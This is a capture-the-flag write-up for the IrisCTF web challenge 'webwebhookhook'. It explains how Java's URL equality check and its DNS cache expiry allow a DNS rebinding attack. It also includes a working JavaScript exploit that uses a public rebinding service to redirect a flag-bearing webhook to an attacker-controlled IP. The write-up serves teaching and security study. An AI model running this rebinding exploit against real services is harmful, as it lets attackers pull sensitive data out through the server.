# webwebhookhook (web, medium)

> I made a service to convert webhooks into webhooks.

## Challenge
The challenge provides a server which forwards requests received from a "webhook" endpoint to another based on a query parameter and a saved entry including the response and a template to modify the original POST data with. There is one included webhook which sends the flag to `http://example.com/admin`.

## Solution
When the server recieves a request, it looks at the "hook" parameter to determine which saved webhook the request corresponds to. It decides wihch webhook is matching by comparing the saved webhook as a URL object to the recieved webhook, which is also converted to a URL. However, there is a relatively well known catch with the URL object in which equality is checked using the IP of the URLs after DNS resolution, rather than comparing the hostname. In addition, the request's "hook" URL is what is used for creating the new request, which means that the new request may have a different URL host than the saved URL.

The call to `hook.openConnection()` actually performs a new DNS resolution on the url, which opens the connection up to DNS rebinding attacks. However, blindly attempting to exploit by sending requests constantly is unlikely to work as there are no clear slow code lines between the resolutions, and because Java has an resolver cache.

The DNS resolver cache is included partially to prevent against DNS rebinding attacks and saves DNS lookup results for 30 seconds by default (the property is specifically under Java security settings!). However, we can exploit the time right when the DNS resolver cache expires to cause the first comparison to use a cached result and the `openConnection` call to resolve the URL again.

There are still more things we can keep in mind in order to make our exploit more reliable. First, we should ensure our rebinding service always returns the IP for `example.com` on the first request and our server on the second request right after the cache entry expires. Next, we can determine whether our requests arrived too early or too late based on the response from the server. If the server responds with "ok", we know our request was either before the DNS cache expired or we solved the challenge, as the "hook" check passed. Otherwise, the response will be "fail" as the entry expired. Finally, all attempts should use different hostnames in order to prevent the attempts from interfering with each other and the rebinder state becoming incorrectly offset.

My solution is using the Singularity of Origin DNS rebinding service available [here](https://github.com/nccgroup/singularity/wiki/How-to-Create-Manual-DNS-Requests-to-Singularity%3F). This solution works every 2-3 attempts.

```js
const CACHE_TIME = 30;
const TIME_OFFSET = 4.5; // Time representing the approximate network latency.
// If you receive only "ok" responses and no flag, you should decrease the number,
// and if you receive only "fail" responses you should increase the number,

// Destination IP ('x.x.x.x') or CNAME entry ('-attacker.com')
const dest = '1.2.3.4';

// Rebind example.com to dest with the first-second strategy
const URL_BASE_PLAIN = `http://s-93.184.215.14-${dest}-%d-fs-e.d.rebind.it/admin`;
const URL_BASE_ENCODED = `http%3A%2F%2Fs-93.184.215.14-${dest}-%d-fs-e.d.rebind.it%2Fadmin`;

const base = "https://webwebhookhook-instance.i.chal.irisc.tf";

// Send a request.
async function req(i, sess) {
  r = await fetch(`${base}/webhook?hook=` + (URL_BASE_ENCODED.replace("%d", sess)), {"method": "POST", "body": '"' + "a".repeat(0x1000) + '"', "headers": {"Content-Type": "text/plain"}}); // Try to slow it down with a body but likely unimportant (didn't test particularly)
  r = await r.text();
  console.log(">", r, i);
}

const sleep = ms => new Promise(r => setTimeout(r, ms));

async function go() {
  let sess;
  while(1) {
    sess = Math.floor(Math.random() * 2**32);
    r = await fetch(`${base}/webhook?hook=` + (URL_BASE_ENCODED.replace("%d", sess)), {"method": "POST", "body": '"' + "a" + '"', "headers": {"Content-Type": "text/plain"}});
    r = await r.text();
    console.log(sess, r);
    if (r.includes("ok")) // Should always pass with rebind.it
      break;
  }
  await sleep((CACHE_TIME - TIME_OFFSET) * 1000);
  let st = performance.now();
  let i = 0;
  while (performance.now() < st + 500) {
    req(i, sess);
    i++;
  }
}

go();
```

Flag: `irisctf{url_equals_rebind}`
